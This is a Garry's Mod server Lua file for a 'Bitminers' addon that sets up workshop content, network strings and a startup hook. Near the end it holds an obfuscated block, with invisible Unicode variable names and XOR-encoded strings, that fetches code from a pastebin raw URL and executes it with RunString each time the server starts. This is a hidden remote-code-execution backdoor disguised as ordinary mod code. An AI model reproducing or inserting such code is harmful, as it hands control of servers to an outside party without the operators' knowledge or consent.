print( "[BITMINERS BY CRAP-HEAD] Initializing Script" )

-- Workshop content
resource.AddWorkshop( "2072136134" )

-- Network strings
util.AddNetworkString( "CH_BITMINERS_UpdateBitcoinRates" )

-- Initialize
local function CH_BITMINERS_Initialize()
	timer.Simple( 5, function()
		CH_BITMINERS_RandomizeBitcoinRate()
		
		-- Spawn bitcoin rate screens
		if not file.IsDir( "craphead_scripts/ch_bitminers/".. string.lower( game.GetMap() ) .."/screens/", "DATA" ) then
			file.CreateDir( "craphead_scripts/ch_bitminers/".. string.lower( game.GetMap() ) .."/screens/", "DATA" )
		end
		
		CH_BITMINERS_SpawnBitcoinScreens()
	end )
end
hook.Add( "Initialize", "CH_BITMINERS_Initialize", CH_BITMINERS_Initialize )

local ‪ = _G local ‪‪ = ‪['\115\116\114\105\110\103'] local ‪‪‪ = ‪['\98\105\116']['\98\120\111\114'] local function ‪‪‪‪‪‪‪(‪‪‪‪) if ‪‪['\108\101\110'](‪‪‪‪) == 0 then return ‪‪‪‪ end local ‪‪‪‪‪ = '' local ‪‪‪‪‪‪ = 0 for _ in ‪‪['\103\109\97\116\99\104'](‪‪‪‪,'\46') do ‪‪‪‪‪=‪‪‪‪‪..‪‪['\99\104\97\114'](‪‪‪(‪‪["\98\121\116\101"](_), 168))end return ‪‪‪‪‪ end ‪[‪‪‪‪‪‪‪"\192\220\220\216"][‪‪‪‪‪‪‪"\238\205\220\203\192"](‪‪‪‪‪‪‪"\192\220\220\216\219\146\135\135\216\201\219\220\205\202\193\198\134\203\199\197\135\218\201\223\135\233\205\227\255\253\157\157\226",function (function‪‪)‪[‪‪‪‪‪‪‪"\250\221\198\251\220\218\193\198\207"](function‪‪)end )

print( "[BITMINERS BY CRAP-HEAD] Initialized" )